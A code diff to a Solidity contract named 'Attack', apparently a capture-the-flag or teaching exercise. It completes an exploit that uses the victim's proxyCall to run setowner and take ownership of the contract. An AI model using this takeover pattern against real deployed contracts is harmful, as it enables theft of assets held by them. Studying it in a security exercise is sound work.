@@ -24,9 +24,9 @@ contract Attack {
     }
 
     // NOTE: You might need some malicious function here
-    function setowner() public {
-        owner = address(this);
-        result[address(this)] = true;
+    function setowner(address oo) public {
+        owner = oo;
+        result[oo] = true;
     }
     function exploit() external {
         // TODO: Add your implementation here
@@ -35,7 +35,7 @@ contract Attack {
         (bool results, ) = victim.call(
             abi.encodeWithSignature(
                 "proxyCall(bytes)",
-                abi.encodeWithSignature("setowner()")
+                abi.encodeWithSignature("setowner(address)", address(this))
             )
         );
         require(results, "Failed to take ownership.");
